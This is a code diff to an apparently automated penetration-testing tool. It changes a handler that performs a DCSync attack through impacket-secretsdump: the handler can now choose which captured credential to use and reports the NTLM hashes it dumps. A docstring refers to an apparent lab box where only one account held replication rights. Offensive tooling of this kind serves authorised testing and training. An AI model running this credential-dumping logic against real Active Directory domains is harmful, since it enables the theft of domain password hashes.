@@ -495,14 +495,42 @@ def _h_writable_objects(ctx) -> ActionResult:
 
 
 def _h_secretsdump(ctx) -> ActionResult:
+    """DCSync via impacket-secretsdump.
+
+    Accepts an optional ``args={"user": "<username>"}`` to select a specific
+    credential from valid_creds instead of the default first non-machine pick.
+    This is needed when different accounts hold different AD rights — e.g. only
+    the delegated replication account (not the local admin) has GetChanges +
+    GetChangesAll (Administrator box pattern: emily was picked by default but
+    only ethan had DCSync rights).
+    """
     from lib import credsmode
-    ready = _enum_cred_or_none(ctx)
-    if ready is None:
+    domain = ctx.facts.discovered_domain or ctx.domain
+    if not domain:
         return ActionResult(ok=False, summary="need a domain and a valid credential")
-    domain, user, pw = ready
+
+    user_override = (ctx.args or {}).get("user")
+    if user_override:
+        valids = ctx.facts.snapshot()["valid_creds"]
+        pair = next(
+            ((u, p) for u, p in valids if u.lower() == user_override.lower()), None
+        )
+        if pair is None:
+            avail = ", ".join(f"`{u}`" for u, _ in valids) or "none"
+            return ActionResult(
+                ok=False,
+                summary=f"user '{user_override}' not in valid_creds — available: {avail}",
+            )
+        user, pw = pair
+    else:
+        cred = _pick_enum_cred(ctx.facts)
+        if cred is None:
+            return ActionResult(ok=False, summary="need a domain and a valid credential")
+        user, pw = cred
+
     n = credsmode._ad_secretsdump(ctx.ip, domain, user, pw, ctx.runner,
                                   ctx.findings, ctx.facts, ctx.available)
-    return ActionResult(ok=True, summary=f"{n} NTLM hash(es) via secretsdump")
+    return ActionResult(ok=True, summary=f"{n} NTLM hash(es) via secretsdump as {user}")
 
 
 # ── recon-completeness: relay/coercion surface, ADCS + MSSQL enumeration ──────
